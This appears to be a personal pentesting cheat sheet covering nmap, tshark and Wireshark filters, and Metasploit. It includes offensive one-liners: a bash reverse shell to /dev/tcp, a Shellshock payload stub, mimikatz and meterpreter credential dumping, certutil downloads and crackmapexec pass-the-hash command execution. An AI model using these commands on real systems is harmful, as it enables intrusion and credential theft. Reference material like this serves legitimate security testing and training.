# Windows Command Cheat-Sheet

- Download Files
- certutil -urlcache -f <url> <filename>

## mimikatz

- lsadump::sam

#### nmap cheat sheet

[list of build in scripts](https://nmap.org/nsedoc/scripts/)

- ping only: `nmap -sn <network>`
- scan ip list: `nmap -iL <file>`
- no ping probe: `nmap -Pn <host>`
- __all__ ports: `nmap -p- <host>`
- ports: `nmap -p 80,443,1000-2000 <host>`
- fast scan `nmap -F <host>`
- udp scan: `nmap -sU <host>`
- agressive scan: `nmap -A <host>`
- service version: `nmap -sV <host>`
- os version: `nmap -O <host>`
- default script scan: `nmap -sC <host>`
- speed (slow to fast): `nmap -T[0-5]`
- output:
    - normal `nmap -oN file.txt`
    - xml `nmap -oX file.xml`

# metersploit

- enter session in bg:
    - sessions
    - sessions -i <num>

## module cheat sheet

### multi/handler

- Important Options
    - RHOSTS target IP
    - PAYLOAD the payload used for the payload
        - windows/x64/metersploit/reverse_tcp

## meterpreter

- hashdump
    - format: <Username>:<SID>:<LN Hash>:<NTLM Hash>:::

# Python

- Web Server
    - python -m SimpleHTTPServer <port>

    () { :; }; echo; echo; /bin/bash -c ''

# tshark

- protocol stats: tshark -r <file> -z io,phs -q
- display filter: tshark -r <file> -Y <filter expression>
- change fields: tshark -r <file> -Tfields -e <field name> -e <field name>

For field names see the reference in the next chapter.

# Wireshark & tshark filters

Reference: https://www.wireshark.org/docs/dfref/

Examples:

- `http contains <str>`
    - `<whatever> contains <str>`
- `http.request.method == <method>`
- `http.host == <host>`
- `wlan.ssid`
- `wlan.bssid`
- `wlan_radio.channel`

## WLAN

- filter for beacons: `wlan.fc.type_subtype == 0x0008`
- wpa filter: `wlan.wfa.ie.wpa.version == 1`
- Robust Security Network (RSN) filter: `wlan.tag.number == 48`
- wlan transmit/received mac addr: `wlan.ta == <mac> || wlan.ra == <mac>`
- wlan data frames `wlan.fc.type_subtype == 0x0020`
    - usefull with bssid (obtained from beacon: transmitter) filter: `wlan.bssid == <mac>`
- wlan association response: `wlan.fc.type_subtype == 0x0001`
- wlan deauth packages: `wlan.fc.type_subtype == 0x000c`
- filter for wpa handshakes `eapol`

Nice to know:
- RSN == WPA2
    - RNS PSK -> WPA2-PSK

# misc
- crackmapexec smb <ip> -u <user> [-p <password>|-H <hash>] -x <command>
- reverse shell listener: nc -nvlp <port>
- reverse shell connector: bash -i >& /dev/tcp/<ip>/<port> 0>&1